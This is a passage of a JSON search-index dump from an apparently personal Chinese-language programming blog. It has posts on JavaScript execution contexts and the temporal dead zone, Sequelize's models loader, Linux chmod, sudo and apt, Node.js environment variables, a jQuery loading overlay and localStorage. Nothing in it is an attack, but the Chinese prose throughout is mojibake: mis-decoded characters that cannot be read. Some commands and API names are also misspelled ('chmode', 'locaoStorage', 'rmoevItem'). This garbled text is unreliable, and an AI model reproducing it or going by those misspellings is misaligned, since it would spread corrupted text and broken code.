èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ° a ä¸¦ä¸”è³¦å€¼ï¼ˆa=30ï¼‰ Line13 b = 200 JS å¼•æ“ï¼šinner scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° b çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šinner scope èªªæ²’æœ‰ï¼Œæ‰€ä»¥å»å•ä¸Šä¸€å±¤çš„ test scopeJS å¼•æ“ï¼štest scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° b çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼štest scope èªªæ²’æœ‰ï¼Œæ‰€ä»¥å»å•ä¸Šä¸€å±¤çš„ global scopeJS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° b çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šglobal scope èªªæ²’æœ‰ã€‚ é€™é‚Šæœƒæœ‰å…©ç¨®çµæœï¼š éåš´æ ¼æ¨¡å¼ï¼šæŠŠ b åŠ åˆ° global EC ä¸­ä¸¦è¨­å€¼ç‚º 200 åš´æ ¼æ¨¡å¼ï¼šReferenceError: b is not defined Line9 console.log(â€˜4.â€™, a) JS å¼•æ“ï¼štest scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šinner scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ°è¿”å› a çš„å€¼ï¼ˆ30ï¼‰ Line17 console.log(â€˜5.â€™, a) JS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šglobal scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ°è¿”å› a çš„å€¼ï¼ˆ1ï¼‰ Line18 a = 70 JS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ LHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šglobal scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ° a ä¸¦ä¸”è³¦å€¼ï¼ˆa=70ï¼‰ Line19 console.log(â€˜6.â€™, a) JS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° a çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šglobal scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ°è¿”å› a çš„å€¼ï¼ˆ70ï¼‰ Line20 console.log(â€˜7.â€™, b) ï¼ˆå‡è¨­é€™é‚Šæ˜¯éåš´æ ¼æ¨¡å¼ï¼‰ JS å¼•æ“ï¼šglobal scopeï¼Œæˆ‘é€™è£¡æœ‰å€‹å° b çš„ RHS å¼•ç”¨ï¼Œä½ æœ‰çœ‹éå®ƒå—ï¼ŸåŸ·è¡Œçµæœï¼šglobal scope èªªæœ‰ï¼Œæ‰€ä»¥æˆåŠŸæ‰¾åˆ°è¿”å› b çš„å€¼ï¼ˆ200ï¼‰ é—œæ–¼ let èˆ‡ const çš„ Temporal Dead Zone(TDZ)å…¶å¯¦å°±è·Ÿ var å®£å‘Šçš„è®Šæ•¸ä¸€æ¨£ï¼Œlet è·Ÿ const åœ¨ç·¨è­¯éšæ®µçš„æ™‚å€™ä¸€æ¨£æœƒè¢«æ”¾åˆ° VO è£¡é¢ï¼Œä½†ä¸æœƒè¢«è¨­æˆ undefinedï¼Œé€™æ˜¯æœ€é‡è¦çš„å·®åˆ¥ï¼Œä¾‹å¦‚èªªï¼š 1234567function test() { console.log(b) // undefined console.log(a) // ReferenceError let a = 10 var b = 20}test() åˆå§‹åŒ–çš„ EC é•·é€™æ¨£ï¼š 123456test EC{ vo: { a: ä¸æœƒè¨­å€¼, b: undefined }} å› ç‚º VO ä¸­çš„ a æ²’æœ‰å€¼ï¼Œæ‰€ä»¥è·‘åˆ° console.log(a) çš„æ™‚å€™æœƒç›´æ¥ ReferenceError: Cannot access 'a' before initializationã€‚ åœ¨åŸ·è¡Œåˆ° let a = 10 é€™è¡Œä¹‹å‰å°±å«åšã€ŒTemporal Dead Zone(TDZ)ã€ï¼Œåªè¦åœ¨ TDZ æœŸé–“å»å­˜å–è®Šæ•¸éƒ½æœƒç›´æ¥å™´éŒ¯ï¼Œå…¶å¯¦å°±åªæ˜¯é€™æ¨£ï¼Œä¸ç”¨è¢«å°ˆæœ‰åè©åš‡åˆ°ï¼Œlet è·Ÿ const ä¸€æ¨£æœ‰ hoisting çš„è¡Œç‚ºï¼Œæ²’æœ‰ä¾‹å¤–ã€‚ çµå°¾å…¶å¯¦é€™ç¯‡ç­†è¨˜å¯«çš„æœ‰é»æ··äº‚ï¼Œå¯èƒ½æ˜¯æˆ‘é‚„ä¸å¤ ç†Ÿæ‚‰å§ï¼Œä½†ç›®å‰æˆ‘æ‰€çŸ¥é“çš„å°±æ˜¯é€™æ¨£ï¼Œä¹‹å¾Œç­‰æˆ‘æ›´ç†è§£å¾Œå†ä¾†æ…¢æ…¢è£œé½Šã€‚ å¦å¤–é‚„æƒ³è£œå……çš„ä¸€é»æ˜¯ï¼Œfunction ä¹‹æ‰€ä»¥èƒ½å¤ äº’ç›¸å‘¼å«å°±æ˜¯é€éã€Œç·¨è­¯éšæ®µç”¢ç”Ÿçš„ VO ã€ä¾†é”æˆçš„ï¼Œæœ‰äº† VO å¾Œ function å°±å¯ä»¥åƒè€ƒ VO å»å‘¼å«å¦å¤–ä¸€å€‹ functionï¼Œåƒé€™æ¨£ï¼š 1234567function a() { b()}a()function b() { console.log('yo')} 123456global EC{ VO: { a: Function, b: Function }} å¤§æ¦‚å°±æ˜¯é€™æ¨£ï¼Œå…¶ä»–çš„ç­‰ä»¥å¾Œå†è£œå§ï½","link":"/2022/02/02/learn-execution-contexts-before-hoisting/"},{"title":"å¾è§£è®€ Sequelize çš„åŸ·è¡Œæª”ä¾†å­¸ç¿’ Node.js çš„æª”æ¡ˆç›¸é—œ API","text":"è©²æ˜¯ä¾†è£œé€™å€‹å‘äº†ã€‚ ç°¡è¿°é€™ç¯‡å­¸å®Œå¾Œæˆ‘æ‡‰è©²è¦å­¸åˆ°ï¼š __dirnameï¼Œç›®å‰ä½ç½®çš„è³‡æ–™å¤¾è·¯å¾‘ __filenameï¼Œç›®å‰ä½ç½®çš„æª”æ¡ˆè·¯å¾‘ path.basenameï¼Œè®€å–è·¯å¾‘æœ€å¾Œçš„è³‡æ–™å¤¾ / æª”æ¡ˆçš„åç¨± fs.readdirSyncï¼Œè®€å–è³‡æ–™å¤¾åº•ä¸‹çš„æ‰€æœ‰æª”æ¡ˆ / è³‡æ–™å¤¾ path.join æ‹šè·¯å¾‘éŠæˆ²ï¼Œå¡«ä»€éº¼å°±æ¥ä»€éº¼ ç¸½ä¹‹å»¢è©±ä¸å¤šèªªï¼Œç›´æ¥ä¾†çœ‹ codeï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556'use strict';// å®Œæ•´è·¯å¾‘ = D:\\restaurant\\models\\index.js// __dirname = D:\\restaurant\\modelsï¼ˆåªå«è³‡æ–™å¤¾ï¼‰// __filename = D:\\restaurant\\models\\index.jsï¼ˆåŒ…å«æª”æ¡ˆï¼‰// path.basename(__filename) = index.js å–å¾—æª”æ¡ˆåç¨±// path.basename(__filename, '.js') = index å»æ‰é™„æª”åconst fs = require('fs');const path = require('path');const Sequelize = require('sequelize');const basename = path.basename(__filename);// å¦‚æœæœ‰ set NODE_ENV å°±æœƒå„²å­˜ï¼Œä¸ç„¶å°±å­˜ developmentï¼ˆè¨˜å¾—ä¸è¦ç©ºæ ¼ï¼Œå¾ˆé›·ï¼‰const env = process.env.NODE_ENV || 'development';// å¼•å…¥ config.jsï¼Œä¸¦è®€å– env å±¬æ€§const config = require(__dirname + '/../config/config.js')[env];const db = {};let sequelize;// åˆ° config æ‰¾æœ‰æ²’æœ‰ use_env_variable å±¬æ€§ï¼ˆå®ƒçš„å€¼æ‡‰è©²ä»£è¡¨æŸå€‹ç’°å¢ƒè®Šæ•¸ï¼‰if (config.use_env_variable) { // æœ‰çš„è©±å°±å¥—ç”¨å®ƒçš„é€£ç·šè³‡è¨Šï¼šmysql://root:password@mysql_host.com/database_name sequelize = new Sequelize(process.env[config.use_env_variable], config);} else { // æ²’æœ‰çš„è©±å°±æ˜¯ç”¨ username + database + ... çš„æ ¼å¼ sequelize = new Sequelize(config.database, config.username, config.password, config);}/* 1. è®€å–ç›®å‰è³‡æ–™å¤¾åº•ä¸‹çš„æ‰€æœ‰æª”æ¡ˆ [ 'announcement.js', 'index.js', 'prize.js', 'user.js' ] 2. ç•™ä¸‹æ˜¯æª”æ¡ˆçš„æ±è¥¿ï¼ˆ.ï¼‰ &amp;&amp; ä¸æ˜¯ index.js &amp;&amp; æ˜¯ .js çš„æª”æ¡ˆ 3. æŠŠé€™äº›æª”æ¡ˆå¼•å…¥å¾Œ call functionï¼ˆå¼•å…¥é€²ä¾†çš„æ±è¥¿éƒ½æ˜¯ functionï¼‰ 4. æŠŠå»ºç«‹çš„ model ç¶åˆ° db[model.name] ä¸Š 5. è®€å– db çš„æ¯å€‹ keyï¼Œå¦‚æœæœ‰å»ºç«‹é—œè¯ï¼ˆassociateï¼‰ï¼Œå°±æŠŠå®ƒå€‘ç¶èµ·ä¾†*/fs .readdirSync(__dirname) .filter(file =&gt; { return (file.indexOf('.') !== 0) &amp;&amp; (file !== basename) &amp;&amp; (file.slice(-3) === '.js'); }) .forEach(file =&gt; { const model = require(path.join(__dirname, file))(sequelize, Sequelize.DataTypes); db[model.name] = model; });Object.keys(db).forEach(modelName =&gt; { if (db[modelName].associate) { db[modelName].associate(db); }});db.sequelize = sequelize;db.Sequelize = Sequelize;module.exports = db; çœ‹æ‡‚é€™ä»½æª”æ¡ˆå¾Œï¼Œæˆ‘æ‰çŸ¥é“ç’°å¢ƒè®Šæ•¸åˆ°åº•æ€éº¼èª¿ï¼Œä¸ç„¶å¯¦åœ¨æ˜¯éœ§ç…ç…ã€‚","link":"/2022/04/02/learn-nodejs-files-api-from-sequelize/"},{"title":"å¾ chmod èªè­˜ Linux ä¸­çš„æ¬Šé™ç®¡ç†","text":"å¯«ä¸€ç¯‡ä¸€å‹æ°¸é€¸çš„ç­†è¨˜ã€‚ ç°¡è¿°ä¸è«–æ˜¯ Linux é‚„æ˜¯å…¶ä»–ä½œæ¥­ç³»çµ±ï¼Œéƒ½æœƒæœ‰å€‹æ±è¥¿ï¼šæ¬Šé™ç®¡ç† æ¬Šé™ç®¡ç†æ˜¯ç”¨ä¾†é™åˆ¶é€™ä¸‰å€‹å‹•ä½œï¼š Read è®€å– Write å¯«å…¥ Execute åŸ·è¡Œ ä½œæ¥­ç³»çµ±é€šå¸¸æœƒé€éæ¬Šé™ç®¡ç†ä¾†è¨­å®šã€Œä»€éº¼èº«åˆ†å¯ä»¥åšä»€éº¼äº‹ï¼Ÿã€ã€‚ ä¾†çœ‹å€‹ä¾‹å­ï¼Œä¾‹å¦‚åœ¨ CLI è¼¸å…¥ï¼š 1ls -l è¼¸å‡ºçµæœæœƒæ˜¯ï¼š 1234567drwxr-xr-x 1 user 197121 0 åäºŒæœˆ 8 2020 '$RECYCLE.BIN'/drwxr-xr-x 1 user 197121 0 äºŒæœˆ 16 17:04 addetector/-rw-r--r-- 1 user 197121 517 äºŒæœˆ 21 21:13 caeser.jsdrwxr-xr-x 1 user 197121 0 å…­æœˆ 25 2021 Config.Msi/drwxr-xr-x 1 user 197121 0 ä¸‰æœˆ 7 20:03 Download/drwxr-xr-x 1 user 197121 0 ä¸‰æœˆ 11 22:48 mentor-program-5th-benben6515/drwxr-xr-x 1 user 197121 0 ä¸€æœˆ 22 18:16 mentor-program-5th-chachachater/ å¤§æ¦‚è§£é‡‹ä¸€ä¸‹é€™è¦æ€éº¼çœ‹ï¼Œæ‹¿ -rw-r--r-- 1 user 197121 517 äºŒæœˆ 21 21:13 caeser.js ä¾†èˆ‰ä¾‹ï¼š -rw-r--r-- æ¬Šé™ï¼ˆä¸æ˜¯è³‡æ–™å¤¾ï¼Œæ‰€ä»¥é–‹é ­ç”¨ - è¡¨ç¤ºï¼‰ user ç›®å‰ä½¿ç”¨çš„èº«åˆ† 197121 git å…§å»ºçš„ç¾¤çµ„ï¼ˆgroupï¼‰èº«åˆ† 517 æª”æ¡ˆå¤§å°ï¼ˆByteï¼‰ äºŒæœˆ 21 21:13 æœ€å¾Œä¿®æ”¹æ—¥æœŸï¼ˆ2/21 09:13 PMï¼‰ caeser.js æª”æ¡ˆåç¨± é †é“ä¸€æï¼Œd æ˜¯ç”¨ä¾†ä»£è¡¨è³‡æ–™å¤¾çš„æ„æ€ï¼Œæ‰€ä»¥ç”¨ d é–‹é ­çš„å°±æ˜¯è³‡æ–™å¤¾ã€‚ é—œæ–¼æ¬Šé™çš„éƒ¨åˆ†ç•™åˆ°ä¸‹é¢ä¾†è§£èªªã€‚ å…ˆèªè­˜ä½¿ç”¨è€…ç¨®é¡Linux å®šç¾©äº†ä¸‰ç¨®èº«åˆ†ï¼Œåˆ†åˆ¥æ˜¯ï¼š owner group others æ¯ä¸€ç¨®èº«åˆ†éƒ½æœ‰è‡ªå·±çš„æ¬Šé™ï¼š rï¼ˆReadï¼‰ wï¼ˆWriteï¼‰ xï¼ˆExecuteï¼‰ æ‰€ä»¥å¯ä»¥ç•«æˆä¸€å€‹è¡¨æ ¼ï¼š é€™æ™‚å€™å†å›ä¾†çœ‹ rw-r--r-- æ‡‰è©²å°±å¾ˆå¥½æ‡‚äº†ï¼š Owner å…·å‚™ Read å’Œ Write çš„æ¬Šé™ Group å…·å‚™ Read çš„æ¬Šé™ Others å…·å‚™ Read çš„æ¬Šé™ å°±é€™æ¨£å•¦ï¼Œæ²’æœ‰å¾ˆè¤‡é›œã€‚ é—œæ–¼ chmod æŒ‡ä»¤chmod çš„å…¨æ–‡æ˜¯ change modeï¼Œæ˜¯ç”¨ä¾†ã€Œè®Šæ›´æ¬Šé™ã€çš„æŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯ rwx é€™ä¸‰å€‹æ¬Šé™å›‰ã€‚ ä½ æ‡‰è©²éƒ½æ˜¯é€™æ¨£ç”¨çš„ï¼š 123chmod 777 someting.txtchmode a=rwx someting.txtchmode ugo=rwx someting.txt ä¸‰å€‹éƒ½æ˜¯ä¸€æ¨£çš„ï¼Œåªå·®åœ¨å¯«æ³•ä¸åŒè€Œå·²ã€‚æœ€å¸¸è¦‹çš„æ˜¯ç¬¬ä¸€ç¨®ç”¨ã€Œæ•¸å­—ã€ä¾†è¡¨ç¤ºã€‚ï¼ˆå› ç‚ºæ¯”è¼ƒæ–¹ä¾¿å˜›ï¼‰ è‡³æ–¼æ•¸å­—çš„å¯«æ³•ï¼Œç¶²è·¯æœƒæ•™ä½ ä»€éº¼ [4 + 2 + 1] ä¹‹é¡çš„ç®—æ³•ï¼Œæˆ‘è‡ªå·±çœ‹çš„æ˜¯è »æ··äº‚çš„ï¼Œæ‰€ä»¥ä¾†è¬›ä¸€å€‹æˆ‘è¦ºå¾—æ¯”è¼ƒå¥½ç†è§£çš„æ–¹æ³•ã€‚ é€™å€‹æ–¹æ³•å°±æ˜¯æŠŠæ¯ä¸€å€‹æ•¸å­—éƒ½è½‰æˆã€ŒäºŒé€²ä½ã€ï¼Œåƒè€ƒé€™å¼µåœ–ï¼š è®Šæˆ 0101 ä»¥å¾Œï¼Œå°±å¯ä»¥çŸ¥é“å°æ‡‰çš„ rwx æ˜¯ true é‚„æ˜¯ false äº†ï¼š æ‰€ä»¥ä»¥æ­¤é¡æ¨ï¼Œæœ€å¾Œå¯ä»¥å¾—å‡ºï¼š Owner rwx Group râ€“ Others -w- çµåˆä¸”ä¾†å°±æ˜¯ rwxr---w-ã€‚ å¦‚æœä½ è¦ºå¾—è‡ªå·±ç®—å¾ˆéº»ç…©ï¼Œå¯ä»¥åƒè€ƒé€™è£¡ï¼šchmod è¨ˆç®—æ©Ÿ å°±æ˜¯é€™æ¨£å›‰ï¼","link":"/2022/03/14/linux-chmod/"},{"title":"Linux ä¸­çš„æŒ‡ä»¤","text":"åšå€‹ç­†è¨˜ã€‚ ç°¡è¿°åœ¨ ä¸€åˆ€æœªå‰ªçš„ AWS éƒ¨ç½²ç´€éŒ„ è£¡é¢æœ‰ç”¨åˆ° Linux æŒ‡ä»¤ï¼Œç•¶æ™‚æ²’æœ‰ç‰¹åˆ¥è§£é‡‹ï¼Œæ‰€ä»¥é€™é‚Šé‡æ–°ä»‹ç´¹ä¸€ä¸‹ã€‚ é€™è£¡åªæœƒç°¡å–®ä»‹ç´¹ç”¨æ³•ï¼Œæ¯”è¼ƒç´°ç¯€çš„éƒ¨ä»½å¯ä»¥åƒè€ƒï¼šLinux çš„ su èˆ‡ sudo æŒ‡ä»¤æ•™å­¸èˆ‡ç¯„ä¾‹ sudo èˆ‡ sué€™å…©å€‹éƒ½æ˜¯è·Ÿã€Œä½¿ç”¨è€…æ¬Šé™ã€ç›¸é—œçš„æŒ‡ä»¤ã€‚ ä¸€èˆ¬ä½œæ¥­ç³»çµ±éƒ½æœƒåšã€Œæ¬Šé™ç®¡ç†ã€ï¼Œåƒä½ è¦è®€æŸäº›æª”æ¡ˆæˆ–æ”¹æŸäº›è¨­å®šæ™‚ï¼Œç³»çµ±æœƒå…ˆæª¢æŸ¥ä½ çš„æ¬Šé™ã€‚å¦‚æœä½ æ¬Šé™ä¸è¶³çš„è©±å°±ä¸è®“ä½ åšã€‚ åœ¨ Linux ç³»çµ±ä¹Ÿä¸€æ¨£ï¼Œæ¬Šé™æœ€é«˜çš„ä½¿ç”¨è€…æ˜¯ã€Œrootã€ï¼Œä¸éä¸å»ºè­°ä½ ç›´æ¥ä»¥ root çš„èº«åˆ†ç™»å…¥ï¼Œå› ç‚ºå¯ä»¥åšä»»ä½•ä¿®æ”¹ï¼Œæ”¹éŒ¯æ±è¥¿çš„è©±å¯èƒ½æœƒæŠŠæ•´å€‹ç³»çµ±ç©å£ã€‚æ‰€ä»¥å»ºè­°ç­‰çœŸçš„æœ‰éœ€è¦æ™‚æ‰é€é su æˆ– sudo ä¾†é–‹å•Ÿ root çš„æ¬Šé™ã€‚ é™„è¨»ï¼šsu çš„å…¨æ–‡æ˜¯ super userï¼Œè€Œ sudo å‰‡æ˜¯ super user doã€‚ su æŒ‡ä»¤ç”¨æ³•å¾ˆç°¡å–®ï¼Œåªè¦è¼¸å…¥ su å¾Œå†è¼¸å…¥å¯†ç¢¼å°±å¯ä»¥å–å¾—æ¬Šé™ï¼š 1su sudo æŒ‡ä»¤é€™å°±æ˜¯æˆ‘éƒ¨ç½²æ™‚ç”¨çš„ï¼Œå¯ä»¥æƒ³æˆæ˜¯ã€Œç”¨ root çš„æ¬Šé™åŸ·è¡ŒæŸå€‹æŒ‡ä»¤ã€ï¼š 12# è¤‡è£½æª”æ¡ˆsudo cp myfile.php newfile.php apt æŒ‡ä»¤apt çš„å…¨åæ˜¯ã€ŒAdvanced Packaging Toolã€ï¼Œä¸­æ–‡æ˜¯ã€Œé€²éšæ‰“åŒ…å·¥å…·ã€ã€‚ å…¶å¯¦å°±æ˜¯å¥—ä»¶ç®¡ç†å™¨ï¼Œæ‰€ä»¥å¯ä»¥æŠŠå®ƒæƒ³æˆæ˜¯ Linux ç‰ˆçš„ NPMï¼Œé€™æ¨£å°±èƒ½é¦¬ä¸Šç†è§£å®ƒæ˜¯å¹¹å˜›ç”¨çš„äº†ã€‚ é™„è¨»ï¼šapt å¿…é ˆæœ‰ root æ¬Šé™ï¼Œæ‰€ä»¥å¾—æ­é… sudo ä¾†ä½¿ç”¨ã€‚ ä¾‹å¦‚åœ¨éƒ¨ç½²æ™‚æœ‰å€‹æ­¥é©Ÿæ˜¯å®‰è£ tasksel é€™å€‹å¥—ä»¶ï¼š 1sudo apt install tasksel é€™å°±è·Ÿä½ ç”¨ï¼š 1npm install jquery çš„æ¦‚å¿µ 87 åˆ†åƒå°å§ï¼Ÿæ‰€ä»¥é€™å°±æ˜¯å®ƒçš„ç”¨æ³•ã€‚ æ¥ä¸‹ä¾†ä»‹ç´¹ä¸€ä¸‹éƒ¨ç½²æ™‚çš„ç”¨åˆ°çš„å¹¾å€‹æŒ‡ä»¤ã€‚ sudo apt update1sudo apt update é€™å€‹æŒ‡ä»¤æœƒåˆ—å‡ºæ‰€æœ‰å¯ä»¥æ›´æ–°çš„å¥—ä»¶ï¼š ç¶²è·¯ä¸Šå¯èƒ½æœƒçœ‹åˆ° apt-get çš„ç”¨æ³•ï¼Œä¸éå®ƒè·Ÿ apt å¹¾ä¹æ˜¯ä¸€æ¨£çš„æ±è¥¿ã€‚å¤§æ¦‚å°±è·Ÿ jQuery çš„ $().click å·®ä¸å¤šï¼Œåªæ˜¯æŠŠæ¯”è¼ƒå¸¸ç”¨çš„æŒ‡ä»¤æŠ½å‡ºä¾†è€Œå·²ã€‚ sudo apt upgradeå¦‚æœè¦æŒ‡å®šå¥—ä»¶çš„è©±æœƒåœ¨å¾Œé¢åŠ ä¸Š &lt;package&gt;ï¼Œæ²’æœ‰åŠ å°±æŠŠå¯ä»¥æ›´æ–°çš„å¥—ä»¶éƒ½æ›´æ–°ï¼š 1sudo apt upgrade sudo apt dist-upgrade1sudo apt dist-upgrade é€™å€‹å¯ä»¥æƒ³æˆæ˜¯ sudo apt upgrade çš„å»¶ä¼¸ã€‚ç°¡å–®ä¾†èªªï¼š sudo apt upgrade å¦‚æœè¦æ›´æ–°çš„å¥—ä»¶æœ‰ç›¸ä¾æ€§å•é¡Œè¦è™•ç†ï¼Œé‚£å°±ä¸æ›´æ–°ï¼ˆé¢¨éšªè¼ƒä½ï¼‰ sudo apt dist-upgrade æœ‰ç›¸ä¾å•é¡Œæœƒè‡ªå‹•å¹«ä½ è™•ç†å¥½ï¼Œä¸¦ä¸”æ›´æ–°å¥—ä»¶ï¼ˆé¢¨éšªè¼ƒé«˜ï¼‰ æ‰€ä»¥æ ¹æ“šéœ€æ±‚ä¾†åšé¸æ“‡å°±å¥½ã€‚","link":"/2022/03/11/linux-command/"},{"title":"åœ¨ Node.js è¨­å®šç’°å¢ƒè®Šæ•¸çš„æ–¹æ³•","text":"éš±ç§å¾ˆé‡è¦ã€‚ æ–¹æ³•1ï¼NODE_ENVçœ‹ä¸æ‡‚æˆ‘å¯«çš„è©±å¯ä»¥çœ‹é€™ç¯‡ï¼šä½¿ç”¨process.env.NODE_ENVçš„æ­£ç¡®å§¿åŠ¿ é€šå¸¸é€™å€‹æ˜¯ç”¨ä¾†å€éš” development | test | production é€™ä¸‰ç¨®ä¸åŒçš„åŸ·è¡Œç’°å¢ƒï¼Œæ‰€ä»¥ä½ åªè¦çœ‹åˆ°æœ‰æ®µ code è£¡é¢æœ‰ NODE_ENV é€™å€‹ç’°å¢ƒè®Šæ•¸ï¼Œé‚£é€™ä»½å°ˆæ¡ˆçš„ package.json ä¹Ÿä¸€å®šæœƒæœ‰æ®µ script æ˜¯é€™æ¨£å¯«çš„ï¼š 123\"scripts\": { \"secret\": \"set NODE_ENV=hahahaha &amp;&amp; node index.js\"} å‚™è¨»ï¼šä¸€å®šè¦é€é npm script æ‰æœ‰ç”¨ï¼Œå¦‚æœç›´æ¥åœ¨ terminal ä¸ŠåŸ·è¡Œæ˜¯è®€å–ä¸åˆ°çš„ã€‚ï¼ˆåŸå› å¯ä»¥åƒè€ƒ npm script èˆ‡ npx çš„ç”¨é€”ï¼‰ æ¥è‘—å°±å¯ä»¥åœ¨ index.js è£¡é¢å­˜å–äº†ï¼š 12// index.jsconsole.log(process.env.NODE_ENV) // hahahaha æ–¹æ³•2ï¼ä½¿ç”¨ dotenv å¥—ä»¶æµç¨‹å¦‚ä¸‹ï¼š ç”¨ npm ä¸‹è¼‰ é€™å€‹ å¥—ä»¶ åœ¨å°ˆæ¡ˆæ ¹ç›®éŒ„å»ºç«‹ .env æª”æ¡ˆ ï¼ˆä¸è¦åŠ åç¨±ï¼ŒçœŸçš„å°±æ˜¯ .env è€Œå·²ï¼‰ åœ¨ .env è£¡é¢å¯«ä½ è¦å„²å­˜çš„è®Šæ•¸ åœ¨ index.js è£¡é¢è¼‰å…¥ dotenv å°±å¯ä»¥é€é process.env å–å¾— .env å¯«å¥½çš„è®Šæ•¸ ä¸‹é¢ç°¡å–®æ¼”ç¤ºä¸€ä¸‹ã€‚ è¨­å®šç’°å¢ƒè®Šæ•¸ï¼š 123// .envNAME=PEANUINTERESTING=CODING è¼‰å…¥ç’°å¢ƒè®Šæ•¸ä¸¦å­˜å–ï¼š 123require('dotenv').config()console.log(process.env.NAME) // PEANUconsole.log(process.env.INTERESTING) // CODING","link":"/2022/01/07/load-environment-variable/"},{"title":"Loading-overlay æ‡¶äººåŒ…","text":"æ‡‰è©²ä¹‹å¾Œæœƒè »å¸¸ç”¨åˆ°çš„ï¼Œè¨˜èµ·ä¾†ã€‚ ç°¡è¿°å…ˆè¨­å®š optionsï¼š 12345678// loading æ•ˆæœ$.LoadingOverlaySetup({ background: \"rgba(0, 0, 0, 0.6)\", imageAnimation: false, image: './spinner.svg', imageColor: '#FFD369', size: '50'}); è©³ç´°å¯åƒè€ƒé€™è£¡ æ¥è‘—åªè¦ï¼š 1234// æ‰“é–‹ loading ç•«é¢$.LoadingOverlay('show');// é—œé–‰ loading ç•«é¢$.LoadingOverlay('hide'); é€™æ¨£å°± OK å›‰ï¼","link":"/2022/02/23/loading-overlay-usage/"},{"title":"å€Ÿæ”¾ä¸€ä¸‹å•Šï¼localStorage èˆ‡ sessionStorage","text":"æœ‰å€Ÿç„¡é‚„ã€‚ ç°¡è¿°å…©å€‹éƒ½æ˜¯ç”¨ä¾†å„²å­˜è³‡æ–™ï¼Œå„²å­˜ç¯„åœæ˜¯ä»¥ã€ŒDomainã€ç‚ºå–®ä½ï¼Œä¾‹å¦‚èªªä½ åœ¨ google.com å„²å­˜äº† username: PeaNuï¼Œé‚£å°±åªæœ‰åœ¨é€™å€‹ Domain è£¡é¢å¯ä»¥å­˜å–ï¼Œè¶…å‡ºé€™å€‹ç¯„åœå°±æ‹¿ä¸åˆ°ã€‚ æŸ¥çœ‹æ–¹å¼ï¼ˆä¸€å¼µåœ–å‹åƒè¨€ï¼‰ï¼š å…©å€‹çš„å·®ç•°ï¼š localStorage æ°¸ä¹…ä¿å­˜ AND ä¸åŒåˆ†é å¯ä»¥å…±ç”¨å„²å­˜çš„å…§å®¹ sessionStorage é—œæ‰ç€è¦½å™¨å°±æ¶ˆå¤± AND æ¯å€‹åˆ†é ç¨ç«‹å„²å­˜ï¼Œä¸èƒ½å…±ç”¨ å…¶ä»–æ³¨æ„äº‹é …ï¼š value åªèƒ½å„²å­˜å­—ä¸²ï¼ˆåˆ¥å¿˜äº† JSON ä¹Ÿæ˜¯å­—ä¸²ï¼Œæ‰€ä»¥é€™æ¨£å°±å¾ˆå¥½ç”¨äº†ï¼‰ localStorageä»‹ç´¹ä¸€ä¸‹åŸºæœ¬ç”¨æ³•ï¼š window.locaoStorage.setItem(key, value) window.locaoStorage.getItem(keyName) window.locaoStorage.rmoevItem(keyNmae) ï¼ˆwindow å¯çœç•¥ï¼Œå› ç‚º window æ˜¯ç€è¦½å™¨ä¸‹çš„å…¨åŸŸç‰©ä»¶ï¼‰ 12345678&lt;div class=\"input-block\"&gt; &lt;span class=\"input-block__text\"&gt;å§“åï¼š&lt;/span&gt; &lt;input class=\"input-block__input\" type=\"text\" size=\"20\"&gt; &lt;button class=\"input-block__button\"&gt;å„²å­˜&lt;/button&gt;&lt;/div&gt;&lt;!-- ç”¨ä¾†é¡¯ç¤ºå„²å­˜çš„å…§å®¹ --&gt;&lt;div class=\"block\"&gt;&lt;/div&gt;&lt;div class=\"block\"&gt;&lt;/div&gt; JavaScriptï¼š 12345678910111213141516171819202122232425262728293031/* é‡æ–°æ•´ç†å¾Œåˆ° localStorage æŠ“å…§å®¹ åˆ†åˆ¥å¯«å…¥ï¼š .input-block__input: è¼¸å…¥æ¡† .input-block__input: ç¬¬ä¸€å€‹å€å¡Šï¼ˆJSON è§£æå¾ŒæŠ“å…§å®¹ï¼‰ .input-block__input: ç¬¬äºŒå€‹å€å¡Šï¼ˆåŸå§‹å­—ä¸²ï¼‰*/const oldValue = localStorage.getItem('username')if (oldValue) { document.querySelector('.input-block__input').value = oldValue document.querySelectorAll('.block')[0].innerText = JSON.parse(oldValue).username document.querySelectorAll('.block')[1].innerText = oldValue}// æŒ‰ä¸‹æŒ‰éˆ•å„²å­˜document.querySelector('.input-block__button') .addEventListener('click', function(e) { setLocalStorage('.input-block__input', 'username') }, false)// æ”¯æ´ Enter éµ window.addEventListener('keydown', function(e) { e.stopPropagation() if (e.key === 'Enter') setLocalStorage('.input-block__input', 'username')}, true)// å„²å­˜åˆ° localStoragefunction setLocalStorage(selector, key) { const input = document.querySelector(selector).value if (input) return localStorage.setItem(key, input) alert('è«‹è¼¸å…¥ä½ æƒ³å„²å­˜çš„å…§å®¹')} seesionStorageç”¨æ³•è·Ÿ localStorage 